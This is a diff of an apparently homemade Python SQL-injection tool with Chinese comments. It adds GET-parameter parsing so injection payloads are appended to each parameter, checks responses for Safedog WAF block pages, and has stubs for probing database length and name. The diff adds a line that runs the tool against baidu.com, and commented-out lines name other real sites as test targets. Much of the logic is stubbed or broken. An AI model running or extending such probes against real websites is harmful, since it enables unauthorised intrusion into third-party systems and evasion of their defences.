@@ -261,34 +261,63 @@ class Payload2(object):
 # class Payload3(object):
 #     c = "hello -> c"
 
-class RePLace(Payload1,Payload2,Find_attribute):
+class RePLace(Payload1,
+              Payload2,
+              Find_attribute,
+              Journal):
     '''针对4.0 payload替换.'''
 
-    def __init__(self,url):
+    def __init__(self,url,name):
         # print(self.b)
         # print(self.a)
         self.payloads = []
         self.url = url
-        pass
+        self.name = None
+        
+    def new_url(self):
+        pars = []
+        url = self.url
+        url = url.split('?')
+        self.url = url[0]+'?'
+        par = url[1]
+        par = par.split('&')
+        for par in par:
+            par = par.split('=')
+            par = par[0]+'='
+            pars.append(par)
+        
+        return pars
+        
+        # pattern = re.compile(r'')
+        # result1 = pattern.findall(v)
 
+    def collect_waf_page(self):
+        """
+        查找存在安全狗的站点
+        """
+        pass
 
     def payload1(self):
         """
-        1.注入点测试
+        1.注入点测试(GET)
         """
         p = self.payloads1
+        pars = self.new_url()
         for p in p:
-            url = self.url+p
-            r = self.req_(url)
-            if "网站防火墙" not in r and "安全狗" not in r:
-                return url
-            else:
-                return url
+            for pars in pars:
+                url = self.url+pars+p
+                r = self.req_(url)
+                if "网站防火墙" not in r and "安全狗" not in r:
+                    self.INFO('发现注入点.')
+                    return url
+                else:
+                    self.ERROR('不存在注入点.')
+                    return False
         
     
     def payload2(self):
         """
-        2.判断数据库长度
+        2.判断数据库长度(GET)
         """
         l = 0
         while True:
@@ -299,12 +328,11 @@ class RePLace(Payload1,Payload2,Find_attribute):
                 return r
             else:
                 return False
-
             l += 1
 
     def payload2_(self):
         """
-        2.判断数据库长度
+        2.判断数据库长度(GET)
         """
         l = 0
         while True:
@@ -320,7 +348,7 @@ class RePLace(Payload1,Payload2,Find_attribute):
 
     def payload2__(self):
         """
-        2.判断数据库长度
+        2.判断数据库长度(GET)
         """
         l = 0
         while True:
@@ -336,7 +364,7 @@ class RePLace(Payload1,Payload2,Find_attribute):
     
     def payload3(self):
         """
-        3.获取数据库名
+        3.获取数据库名(GET)
         """
         pass
 
@@ -550,6 +578,10 @@ if __name__ == "__main__":
     # s = test('https://primarymaths.ephhk.com/pages/contain.php')
     # # s = test('https://www.aynax.com/login.php')
     # s.test()
+
+s = RePLace('https://www.baidu.com/index.php?id=1&xde=2','Fuzz_WaF')
+
+s.payload1()
     
   
 
